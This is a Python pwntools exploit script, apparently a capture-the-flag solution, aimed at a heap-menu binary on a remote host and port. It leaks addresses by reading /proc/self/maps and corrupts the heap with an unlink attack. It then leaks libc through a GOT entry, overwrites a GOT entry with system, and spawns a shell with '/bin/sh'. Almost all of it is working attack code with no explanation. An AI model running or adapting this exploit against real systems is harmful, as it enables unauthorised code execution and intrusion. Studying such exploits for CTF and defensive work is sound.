#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'

#context(arch = 'i386', os = 'linux', log_level='debug')
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "pwn"
#libFile  = "/lib/x86_64-linux-gnu/libc-2.23.so"
libFile  = "./libc.so.6"

remoteIp = "39.97.119.22"
remotePort = 10001

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size):
	sla('>>', str(1))
	sla('?', str(size))

def rm(idx):
	sla('>>', str(2))
	sla('?', str(idx))	

def md(idx, text):
	sla('>>', str(3))	
	sla('?', str(idx))	
	sa('?', text)	

def op(fileName):
	sla('>>', str(4))
	sla('?', str(fileName))
	
def dp(opt, idx):
	sla('>>', str(5))
	sla('text', str(opt))	
	if(opt == 1):
		sla('What index it is?', str(idx))	


def q():
	sla(':', str(6))	

#--------------------------Exploit--------------------------
def exploit():
	#open file then get elf base
	op('/proc/self/maps')
	dp(2, 0)

	rl()
	rl()
	exe_base = int(r(12), 16)

	rl()
	rl()
	rl()
	rl()
	bss_base = int(r(12), 16)
	list_addr = bss_base + 0x140

	li('exe_base ' + hex(exe_base))
	li('list_addr ' + hex(list_addr))

	ad(0x80) #for move ptr in 1

	#unlink attack
	ad(0x58)
	ad(0x80)
	p = p64(0)
	p += p64(0x50)
	p += p64(list_addr + 0x10 - 0x18); #p->fd->bk = p
	p += p64(list_addr + 0x10 - 0x10);#p->bk->fd = p
	p += p64(0x50) #next chun prev_size
	p = p.ljust(0x50, '\x00')
	p += p64(0x50)
	p += '\x90'
	md(1, p)
	rm(2)

	#modify plist
	delete_got = exe_base + 0x5098 #Z...
	read_got   = exe_base + exe.got['read']
	p = p64(0)
	p += p64(read_got)
	p += p64(0x8)
	p += p64(list_addr - 0x8) #keep
	p += p64(0x58) #keep
	p += p64(delete_got)
	p += p64(0x8)
	p = p.ljust(0x59, '\x00')
	md(1, p)

	#get system addr
	dp(1, 0) #puts read got
	read_addr = u64(ru('\x7f')[-5:] + '\x7f\x00\x00')
	libc_base = read_addr - lib.sym['read']
	li('libc_base: ' + hex(libc_base))
	sys_addr = libc_base + lib.sym['system']
	li('sys_addr ' + hex(sys_addr))
	p = p64(sys_addr) + '\x00'
	md(2, p)

	#get shell
	ad(0x10)
	p = '/bin/sh'
	p = p.ljust(0x11, '\x00')
	md(3, p)
	rm(3) #exec sys

	#db()

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

